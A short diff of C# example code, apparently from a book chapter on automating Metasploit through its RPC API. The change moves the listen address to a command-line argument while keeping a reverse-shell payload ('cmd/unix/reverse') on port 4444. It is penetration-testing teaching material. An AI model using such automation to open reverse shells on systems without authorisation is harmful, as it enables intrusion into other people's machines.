@@ -9,13 +9,13 @@ namespace ch13_automating_metasploit
 	{
 		public static void Main (string[] args)
 		{
-			using (MetasploitSession session = new MetasploitSession ("username", "password", "http://127.0.0.1:55553/api")) {
+			string listenAddr = args[1];
+			int listenPort = 4444;
+			string payload = "cmd/unix/reverse";
+
+			using (MetasploitSession session = new MetasploitSession ("username", "password", "http://"+listenAddr+":55553/api")) {
 				if (string.IsNullOrEmpty (session.Token))
 					throw new Exception ("Login failed. Check credentials");
-
-				string listenAddr = "192.168.0.2";
-				int listenPort = 4444;
-				string payload = "cmd/unix/reverse";
 				using (MetasploitManager manager = new MetasploitManager (session)) {
 					Dictionary<object, object> response = null;
 
